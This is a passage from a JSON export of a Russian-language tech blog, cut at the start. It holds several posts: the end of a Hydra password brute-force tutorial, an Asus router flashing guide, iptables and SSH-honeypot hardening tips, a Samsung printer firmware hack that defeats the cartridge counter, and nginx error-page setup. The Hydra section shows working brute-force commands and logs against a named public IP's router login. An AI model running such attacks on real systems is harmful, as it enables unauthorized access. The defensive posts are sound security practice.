пароль и к нему. В рассматриваемом примере это OpenWrt:\n screenshot \nОткрываем панель отладки браузера (F12 в Chromium-based браузерах), вкладка Network и отмечаем галочкой Preserve log. После этого вводим пароль, например, test_passw0rd (логин у нас уже введен), жмем кнопку \u0026ldquo;Login\u0026rdquo;, и смотрим в консоли что и куда уходит:\n screenshot \nОтлично, теперь давай подытожим те данные, которыми мы располагаем:\n IP сервера 178.72.90.181 Сервис http на стандартном 80 порту Для авторизации используется html форма, которая отправляет по адресу http://178.72.90.181/cgi-bin/luci методом POST запрос вида username=root\u0026amp;password=test_passw0rd В случае не удачной аутентификации пользователь наблюдает сообщение Invalid username and/or password! Please try again.  Приступим к запуску гидры:\n$ hydra -l root -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form \u0026#34;/cgi-bin/luci:username=^USER^\u0026amp;password=^PASS^:Invalid username\u0026#34; И тут надо кое-что пояснить. Мы используем http-post-form потому как авторизация происходит по http методом post. После указания этого модуля идет строка /cgi-bin/luci:username=^USER^\u0026amp;password=^PASS^:Invalid username, у которой через двоеточие (:) указывается:\n Путь до скрипта, который обрабатывает процесс аутентификации. В нашем случае это /cgi-bin/luci Строка, которая передается методом POST, в которой логин и пароль заменены на ^USER^ и ^PASS^ соответственно. У нас это username=^USER^\u0026amp;password=^PASS^ Строка, которая присутствует на странице при неудачной аутентификации. При её отсутствии гидра поймет что мы успешно вошли. В нашем случае это Invalid username  Подбор в моем случае идет довольно медленно (~16 паролей в минуту), и связано это в первую очередь с качеством канала и способностью железки обрабатывать запросы. Как мы видим - ей довольно тяжело это делать:\nHydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:15:12 [DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task [DATA] attacking service http-post-form on port 80 [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;!\u0026#34; - 1 of 488 [child 0] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;!!!\u0026#34; - 2 of 488 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;!!!!\u0026#34; - 3 of 488 [child 2] # ... [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;%username%1\u0026#34; - 18 of 488 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;%username%12\u0026#34; - 19 of 488 [child 2] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;%username%123\u0026#34; - 20 of 488 [child 15] [STATUS] 20.00 tries/min, 20 tries in 00:01h, 468 to do in 00:24h, 16 active Подбор пароля по словарю ничего нам не дал, поэтому мы запустим посимвольный перебор. Длину пароля возьмем от 5 до 9 символов, латиницу в нижнем регистре с цифрами и символами !@#:\n$ hydra -l root -x \u0026#34;5:9:a1\\!@#\u0026#34; -o ./hydra_result.log -f -V -s 80 178.72.90.181 http-post-form \u0026#34;/cgi-bin/luci:username=^USER^\u0026amp;password=^PASS^:Invalid username\u0026#34; И видим что процесс успешно запустился:\nHydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 14:31:01 [WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort... [DATA] max 16 tasks per 1 server, overall 64 tasks, 268865638400000 login tries (l:1/p:268865638400000), ~262564100000 tries per task [DATA] attacking service http-post-form on port 80 [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaaa\u0026#34; - 1 of 268865638400000 [child 0] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaab\u0026#34; - 2 of 268865638400000 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaac\u0026#34; - 3 of 268865638400000 [child 2] # ... [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa7\u0026#34; - 30 of 268865638400000 [child 0] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa8\u0026#34; - 31 of 268865638400000 [child 2] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa9\u0026#34; - 32 of 268865638400000 [child 1] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa@\u0026#34; - 33 of 268865638400000 [child 11] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaa#\u0026#34; - 34 of 268865638400000 [child 4] [ATTEMPT] target 178.72.90.181 - login \u0026#34;root\u0026#34; - pass \u0026#34;aaaba\u0026#34; - 35 of 268865638400000 [child 7] И понимая безысходность данного подхода останавливаем процесс, возвращаясь к перебору по большому словарю.\nКстати, для запуска hydra в фоне с продолжением её работы после того, как ты отключишься от ssh можно поступить следующим образом:\n$ hydra -bla -bla -bla -o ./hydra_result.log # Нажимаем CTRL + Z $ disown -h %1 # После этого отключаемся или продолжаем работу # Для возврата к процессу перебора выполни \u0026#39;$ bg 1\u0026#39; # Для того, чтоб после посмотреть работает ли гидра выполни: $ ps ax | grep hydra # А для того чтоб убить все процессы с гидрой: $ for proc in $(ps ax | grep hydra | cut -d\u0026#34; \u0026#34; -f 1); do kill $proc; done; Вместо заключения Не ленись настраивать на своих сервисах/железках защиту от брутфорса. Не используй фуфлыжные пароли. Не расценивай данный материал как призыв к каким-либо действиям. Используй для тестирования своих сервисов.\n","date":"2015-08-12T10:05:15Z","image":"https://blog.hook.sh/hydra-bruteforce-passwd/cover_hu11c621eb481740cf2341ae6f4505da8a_36564_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/hydra-bruteforce-passwd/","title":"Брутим пароли с Гидрой (hydra)"},{"content":"При прошивки данной железки возникают некоторые вопросы, ответы на которые найти порой не так просто. Сейчас постараюсь ответить на основные:\n Можно ли установить на него dd-wrt или open-wrt? - Нет, не заведется, к сожалению Можно ли установить wive-ng? - Да, но \u0026ldquo;глючит\u0026rdquo; на столько, что работать с железкой в итоге не представляется возможным Можно ли после экспериментов \u0026ldquo;откатиться\u0026rdquo; на официальную версию? - Да, и это делается очень просто  Итак, если у тебя появится желание экспериментировать с железкой, то имей в виду следующие моменты:\n  Для того, чтоб выполнять манипуляции с прошивкой роутера необходимо его запустить в Recovery mode. Для этого:\n Вынимаем штекер питания роутера Нажимаем и удерживаем клавишу Reset роутера Вставляем штекер питания роутера, продолжая удерживать нажатой клавишу Reset Когда диод WPS начнет медленно мигать (через ~5 секунд) - отпускаем клавишу Reset Последующее простое выключение/включение роутера заставит его запуститься в стандартном режиме    Для прошивки роутера лучше всего его подключать патч-кордом напрямую к сетевой карте машины с которой будет производиться его прошивка. Оставлять включенным только одно сетевое подключение, всё лишнее - выключать\n  IP адрес выставлять 192.168.1.2 и только. Маска подсети 255.255.255.0. Использование любого другого адреса приводит к тому, что железка не обнаруживается и не прошивается\n  То что 192.168.1.1 (роутер) в Recovery mode не пингуется - нормально, не стоит переживать\n  Для прошивки можно использовать как tftpd, так и утилиту от Asus Firmware Restoration. Вторая проще, и выполняет по видимому всё тот же tftp put %файл%\n  Все основные файлы, которые тебе могут понадобиться как для экспериментов, так и восстановления на сток находятся по ссылкам ниже (прошивки openwrt, Wive-WR и сток находятся в директории ./firmware):\n Скачать  Ссылки по теме  Openwrt wiki касательно этой железки Прошивка роутера Asus RT-G32 C1 на Wive-NG-RTNL ","date":"2015-07-18T10:10:13Z","image":"https://blog.hook.sh/firmware-rt-g32/cover_hufd73581b96404e67b5185b9cf7a13a3b_10015_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/firmware-rt-g32/","title":"Прошивка роутера Asus RT-G32 ver. C1"},{"content":"При сканировании портов целевой системы можно довольно часто наблюдать результат вида:\n... 8080/tcp filtered http-proxy ... Что говорит нам о том что порт наверняка используется системой, но \u0026ldquo;прикрыт\u0026rdquo; извне. Несмотря на то, что работать с ним врятли будет возможно - он всё же дает исследуемому дополнительную информацию об исследуемой системе.\nКак проще всего прикрыть порт извне используя iptables?\n$ iptables -A INPUT -p tcp --dport %номер_порта% -j DROP А как можно прикрыть его так, чтоб он был недоступен только лишь извне, да ещё и не отображался в результатах nmap как filtered?\n$ iptables -A INPUT ! -s 127.0.0.1/8 -p tcp --dport %номер_порта% -j REJECT --reject-with tcp-reset  Если по-человечески, то это означает:\nДля всех входящих пакетов (кроме локального хоста (127.0.0.1/8)), приходящих по протоколу tcp на порт %номер_порта% ответить ICMP уведомлением tcp-reset, после чего пакет будет \u0026ldquo;сброшен\u0026rdquo;.\nТак же возможны варианты ICMP ответа: icmp-net-unreachable, icmp-host-unreachable, icmp-port-unreachable, icmp-proto-unreachable, icmp-net-prohibited и icmp-host-prohibited.\n После чего не забудьте выполнить:\n$ service iptables save $ service iptables restart  Для выполнения $ service iptables save в системе должен присутствовать пакет iptables-services\nЕсли в системе работает fail2ban обязательно перед выполнением $ service iptables save остановите его, выполнив $ service fail2ban stop\n ","date":"2015-07-14T08:59:58Z","image":"https://blog.hook.sh/little-iptables-tips/cover_huca17b364cb926e2346fafd474740dcec_161710_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/little-iptables-tips/","title":"Маленькая хитрость iptables"},{"content":" Honeypot («Ловушка») (англ. горшочек с мёдом) — ресурс, представляющий собой приманку для злоумышленников. (wikipedia.org)\n Одно из первых средств, которое применяется для аудита целевых систем - это сканирование портов с целью выявления, какие же службы (сервисы) там крутятся. Можете даже сейчас натравить nmap на свой сервер и посмотреть, что же он нам о нем расскажет. Самый простой пример результата его работы:\n$ nmap google.com Starting Nmap 6.47 ( http://nmap.org ) at 2050-01-11 00:00 GMT Nmap scan report for google.com (173.194.71.138) Host is up (0.010s latency). Other addresses for google.com (not scanned): 173.194.71.139 173.194.71.113 173.194.71.101 173.194.71.100 173.194.71.102 rDNS record for 173.194.71.138: lb-in-f138.1e100.net Not shown: 998 filtered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 4.92 seconds Из которого мы видим, что на целевой системе открыты 2 порта (стелс-сканирование и прочее мы пока опустим - не к чему оно сейчас): 80/tcp и 443/tcp и это означает, что там наверняка крутится web-сервер, который работает по http и https.\nТеперь подойдем к более интересному моменту.\nДовольно часто администраторы используют для доступа к своим серверам SSH. Стандартный порт для SSH - 22/tcp. Если администратор хоть чуть-чуть \u0026ldquo;шарит\u0026rdquo;, то после установки системы он сразу же перевешивает SSH на не стандартный порт (например 454545), запрещает логин от рута и настраивает авторизацию по сертификату вместо пароля. И оно совершенно правильно - держать SSH на стандартном порту, да без какой-либо дополнительной защиты - потенциально огромная брешь в безопасности.\nА что если повесить на этот самый 22 порт ещё один ssh-демон, но при этом все попытки логина по нему сразу отправлять в fail2ban? Обычным нашим пользователям SSH не нужен, мы ходим через порт 454545, значит тот, кто будет ломиться на 22 порт - бот или злоумышленник, которого необходимо забанить по IP на довольно длительное время. Обойти это ограничение можно будет лишь заюзав VPN, прокси или другое средство смены IP, ну или дождаться пока не пройдет время бана которое мы установим.\nДанную задачу будем решать в 3 этапа:\n Настроим и запустим дополнительный sshd-демон, который будет висеть на 22 порту; Настроим fail2ban, который будет читать логи на попытку коннекта по ssh на 22 порту; Поставим всё это дело в автозапуск;   Все манипуляции буду производить на CentOS 7, разница с другими дистрибутивами - минимальна\n Настройка и запуск дополнительного sshd-демона Считаем, что sshd у нас уже сейчас настроен и висит на отличном от 22 порту. Переходим в директорию с его конфигами и создаем новый конфиг для honeypot:\n$ cd /etc/ssh $ nano ./sshd_config_honeypot Пишем в него следующее (самые интересные моменты пометил желтым цветом):\nPort 22 AddressFamily inet SyslogFacility AUTH LogLevel VERBOSE PermitRootLogin no RSAAuthentication yes PubkeyAuthentication yes IgnoreRhosts yes RhostsRSAAuthentication no HostbasedAuthentication no IgnoreUserKnownHosts yes PermitEmptyPasswords no ChallengeResponseAuthentication no PasswordAuthentication no X11Forwarding no UsePAM yes UseDNS no AllowUsers nobody MaxAuthTries 1 MaxSessions 1 И после чего запускаем новый экземпляр sshd, но работающий именно с этим конфигом:\n$ /usr/sbin/sshd -f /etc/ssh/sshd_config_honeypot $ ps ax | grep sshd 803 ? Ss 0:00 /usr/sbin/sshd -D 2549 ? Ss 0:00 /usr/sbin/sshd -f /etc/ssh/sshd_config_honeypot 14627 ? Ss 0:00 sshd: root@pts/1 14804 pts/1 R+ 0:00 grep --color=auto sshd $ iptables -L -n | grep \u0026#39;:22\u0026#39; $  Для остановки демона можно выполнить (где 2549 это PID нашего процесса):\n $ kill 2549 Если демон у нас корректно запустился - в STDOUT/STDERR ничего критично не сказал, в процессах успешно завертелся, iptables у нас 22 порт не блокирует, пробуем подключиться к серваку с нашей машины:\n$ ssh -p 22 -l nobody 2.2.2.2 Permission denied (publickey). И тут де чекаем лог на сервере:\n$ tail -n40 /var/log/messages | grep sshd Jul 13 12:03:28 zero sshd[14869]: Connection from 1.1.1.1 port 1277 on 2.2.2.2 port 22 Jul 13 12:03:28 zero sshd[14869]: Connection closed by 1.1.1.1 [preauth] Если у тебя картина выгляди аналогично, значит всё работает как надо :) Попытки авторизации у нас обламываются, лог корректно пишется.\nНастройка fail2ban Переходим в директорию с fail2ban и первым делом создаем новый фильтр:\n$ cd /etc/fail2ban $ nano ./filter.d/sshd-honeypot.conf # Example: # Jul 13 09:18:28 zero sshd[8625]: Connection from 1.1.1.1 port 1218 on 2.2.2.2 port 22 [Definition] failregex = ^.+ sshd\\[\\d+\\]: (C|c)onnection from \u0026lt;HOST\u0026gt; port \\d+ on \\d+\\.\\d+\\.\\d+\\.\\d+ port 22$ ignoreregex = Сохраняем, проверяем работоспособность фильтра (важно, чтобы matched было не равно нулю, но и не было сильно больше количества наших попыток коннектов по ssh):\n$ fail2ban-regex /var/log/messages /etc/fail2ban/filter.d/sshd-honeypot.conf | grep matched Lines: 2001 lines, 0 ignored, 1 matched, 2000 missed [processed in 0.20 sec] После чего добавляем новый jail (/etc/fail2ban/jail.local):\n[ssh-honeypot] enabled = true filter = sshd-honeypot action = iptables-allports[name=\u0026#34;ssh_honeypot\u0026#34;, protocol=\u0026#34;all\u0026#34;] maxretry = 1 findtime = 10 # 86400 is 1 day, 259200 is 3 days bantime = 259200 logpath = /var/log/messages  Настоятельно рекомендую добавить свой IP адрес в ignoreip (секции [DEFAULT]), так как есть риск забанить себя на трое суток :) Формат записи следующий (использую 1.1.1.0/8 т.к. IP серый):\n[DEFAULT] ignoreip = 127.0.0.1/8 2.2.2.2 1.1.1.0/8 Или как минимум выставить bantime равным, например, 30 (секундам) - достаточно для того, чтобы проверить и при этом не получить массу неудобств.\n Перезапускаем fail2ban, проверяем лог:\n$ service fail2ban restart $ cat /var/log/fail2ban.log | grep \u0026#39; ERROR \u0026#39; Если лог у нас не содержит никаких критичных ошибок, то остается дело за малым - проверить, будет ли срабатывать правило. Cнова пытаемся приконнектиться к серверу с нашей машины:\n$ ssh -p 22 -l nobody 2.2.2.2 Смотрим на появление строки похожей на следующую в логе fail2ban:\n$ cat /var/log/fail2ban.log | grep ssh-honeypot 2050-01-11 01:00:00,000 fail2ban.filter [15038]: INFO [ssh-honeypot] Ignore 1.1.1.1 by ip Если так оно и есть - значит всё отлично работает - наш IP не был забанен только потому, что он находится в списке игнорируемых :)\nАвтозапуск В автозапуске нуждается лишь наш дополнительный демон sshd, т.к. fail2ban у тебя и так наверняка уже стартует вместе с системой.\nДобавим в файл /etc/rc.local следующую запись:\n## sshd honeypot autostart ssh_honeypot_config=\u0026#39;/etc/ssh/sshd_config_honeypot\u0026#39;; if [ -f $ssh_honeypot_config ] \u0026amp;\u0026amp; [ -x /usr/sbin/sshd ]; then /usr/sbin/sshd -f $ssh_honeypot_config; fi; Которая будет проверять наличие бинарника sshd и наличия нужного конфига. Если два этих условия выполняются, запускаем демона уже знакомым нам методом. Для верности можешь ребутнуть сервер и убедиться, что всё работает.\nТеперь пускай все желающие ломятся на наш SSH - результат для них будет лишь один :)\n","date":"2015-07-13T11:13:57Z","image":"https://blog.hook.sh/ssh-honeypot/cover_hu3201198c97328eef28a158f0c8170276_222779_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/ssh-honeypot/","title":"SSH Honeypot — просто и со вкусом"},{"content":"Где их использовать? Фоновые изображения страниц авторизации, ошибок, анимация. Врубай своё воображение ;) Осторожно - трафик!\n","date":"2015-05-18T15:45:35Z","permalink":"https://blog.hook.sh/little-gifs-collection-part1/","title":"Небольшая коллекция интересных гифок (часть 1)"},{"content":"В самом аппарате есть программное обеспечение (ПО), которое отвечает за все действия. При помощи этого ПО производится отсчет распечатанных страниц с чипа картриджа. Когда допустимое количество листов будет отпечатано, устройство блокируется. И заправкой картриджа, как вы понимаете здесь не обойтись.\nРешением сложившейся ситуации служит прошивка новым программным обеспечением ваш принтер. В обновленном ПО отсутствует счетчик страниц и уровень тонера всегда 100%.\nВ сети можно обнаружить великое множество ресурсов, на которых предлагают бесплатные и якобы рабочие прошивки. Может где-то оно и так, но тут публикую действительно рабочий способ и проверенный на себе способ.\n  Произведем печать отчета о конфигурации - вставляем в лоток 1 лист бумаги, зажимаем и удерживаем клавишу стоп (находится над кнопкой включения принтера) на 5..10 секунд - когда диод начинает медленно мигать зеленым цветом - отпускаем, после чего и распечатывается лист с отчетом. В отчете должны обнаружить версию прошивки v1.01.00.18 или v1.01.00.19. Если версия в отчете о конфигурации вашего принтера выше, то к сожалению этот способ не для вас;\n  Далее нужно скачать архив с генератором (ML1860GEN.zip, пароль на архив ML1860GEN) и извлечь из него файлы в удобное для вас место на компьютере. Данный офф-лайн генератор работает без подключения к сети интернет;\n  Приступаем к генерации файла прошивки для данного принтера. Для этого нужно найти в папке с распакованным архивом файл с именем ml-1860_19nu_gen.exe и делаем его запуск. В окне программа предложит вам ввести серийный номер;\n  Производим ввод серийного номера принтера, он как и версия прошивки находится в отчете о конфигурации. Состоит серийник из пятнадцати (15) знаков, например: Z5MBBKDB803345L, делаем запуск нажав на кнопку Generate. Далее вас проинформируют что генерация успешно завершилась - можно закрывать приложение. В папке, где расположен генератор, обнаружиться новый файл FIX_Z5MBBKDB803345L_ML1860_19NU.hd;\n  Мышью перетаскиваем полученный в предыдущем шаге файл (например, FIX_Z5MBBKDB803345L_ML1860_19NU.hd) на приложение usbprns2.exe. Затем откроется окно консоли Windows, которое по завершению процесса (3..10 секунд) закроется само. Принтер при этом немного пошумит механикой и произведет перезагрузку;\n  Выключаем принтер, достаем картридж, заклеиваем его контакты (например изолентой):\n   photo \n Вставляем картридж обратно, включаем принтер. Наблюдаем как диод теперь не мигает красным, а горит дружелюбным зеленым цветом :)  Так же распечатываем отчет (как в первом пункте). Проверяем чтоб после цифры версии появилась буква F (было V1.01.00.19 12-03-2010, стало V1.01.00.19F12-03-2010). Теперь для того чтоб картридж виделся как полный достаточно просто выключить и включить питание.\n","date":"2015-05-18T15:20:41Z","image":"https://blog.hook.sh/hack-printer-samsung-ml-1860/cover_hu20c3f0b842daba4ef0d24b51a21ac24b_26547_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/hack-printer-samsung-ml-1860/","title":"Прошивка принтера Samsung ML-1860"},{"content":"При работе с web-ресурсом возникают ошибки, и причина их может быть совершенно различна - от опечатки в URL, до ошибок самого сервера. И если у нас внешним сервером является nginx - мы можем довольно удобно указать свое содержание, которое будет выводиться при той или иной ситуации. Во-первых, это позволяет в какой-то мере замаскировать используемое ПО (т.к. определение по сигнатурам ответа становится невозможным); во-вторых - это визуальная кастомизация, которая положительно говорит о ресурсе в целом.\nУказание своих страниц ошибок Для того, чтоб nginx вместо встроенных шаблонов отдавал нужный нам контент - существует следующая конструкция (документация):\nerror_page 401 /401.html; error_page 404 /404.html; Которая нам говорит:\n В случае возникновения ошибки с кодом 401 вывести страницу 401.html, которая находится в корне веб-ресурса, и т.д.\n Страницы ошибок вне директории ресурса Отлично, но что нам делать, если хотим чтоб страницы ошибок лежали отдельно от корневой директории веб-сервера? Нам на помощь приходит location (документация):\nset $errordocs /some/path/to/nginx-errordocs; error_page 401 /401.html; location = /401.html { root $errordocs; } error_page 404 /404.html; location = /404.html { root $errordocs; } Которая говорит:\n Установим в переменную $errordocs значение /some/path/to/nginx-errordocs; в случае возникновения ошибки с кодом 401 вывести страницу 401.html, которая находится в корне веб-ресурса; при запросе страницы 401.html в корне веб-ресурса считать корнем веб-ресурса значение из $errordocs, и т.д. с описанными кодами ошибок\n Глобальные страницы ошибок А теперь ещё один момент - у нас может быть несколько хостов на одном сервере, и прописывать одни и те же настройки для каждого - дело не логичное. Тем более, что если произойдут какие-либо изменения - везде придется их обновлять.\nК сожалению, я не нашел способа сделать их глобальными для всех \u0026ldquo;по умолчанию\u0026rdquo;, но поступил следующим способом:\n Описываем все необходимые коды и страницы им соответствующие\n set $errordocs /some/path/to/nginx-errordocs; error_page 401 /401.html; location = /401.html { root $errordocs; } error_page 403 /403.html; location = /403.html { root $errordocs; } error_page 404 /404.html; location = /404.html { root $errordocs; } error_page 500 /500.html; location = /500.html { root $errordocs; } error_page 502 /502.html; location = /502.html { root $errordocs; } error_page 503 /503.html; location = /503.html { root $errordocs; } Сохраняем в файл /etc/nginx/errordocs_default.inc. Во всех хостах, в секции server {...} дописываем одну строчку (документация):\nserver { # ...  include /etc/nginx/errordocs_default.inc; # ... } Перезапускаем nginx, проверяем.\nПример страницы ошибки В качестве заготовки для содержимого страницы ошибки может быть следующий пример:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;robots\u0026#34; content=\u0026#34;noindex, nofollow\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Error 404\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, maximum-scale=1\u0026#34; /\u0026gt; \u0026lt;link href=\u0026#34;//fonts.googleapis.com/css?family=Oxygen:400,800\u0026#34; rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; html,body{margin:0;padding:0} body{overflow:hidden;text-align:center;background:#1a1a1a} .noselect{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none} *{color:#eee;font-weight:400;font-family:Tahoma,Arial,Verdana;-webkit-transition:all .3s;-moz-transition:all .3s;-o-transition:all .3s;cursor:default;-webkit-font-smoothing:antialiased!important} .screenCenter{position:absolute;height:300px;width:450px;top:50%;left:50%;margin:-150px 0 0 -225px} h1,h4{font-family:Oxygen,Tahoma,Verdana,Arial;width:100%;padding:0;margin:0;text-align:center} h4{font-size:20px;position:absolute;top:110px;background:#1a1a1a;padding:10px 0;z-index:10} h1{font-size:220px;font-weight:800;text-shadow:0 0 32px #fff;color:transparent;opacity:.7;z-index:1} .screenCenter:hover h1{font-size:220px;font-weight:800;text-shadow:0 3px 3px rgba(0,0,0,1);color:#fff;opacity:1!important} .screenCenter:hover h4{opacity:0!important} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;screenCenter noselect\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;File not found\u0026lt;/h4\u0026gt; \u0026lt;h1\u0026gt;404\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Превью примера:\n \nДля создания других страниц будет достаточно изменить в примере все вхождения 404 на необходимый код, и поправить описание ошибки между \u0026lt;h4\u0026gt;...\u0026lt;/h4\u0026gt;.\n","date":"2015-03-03T06:41:38Z","image":"https://blog.hook.sh/customize-nginx-error-pages/cover_hu6ae5f54eb95851fe70ad8a423f008f0a_46330_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/customize-nginx-error-pages/","title":"Настройка страниц ошибок для nginx"}]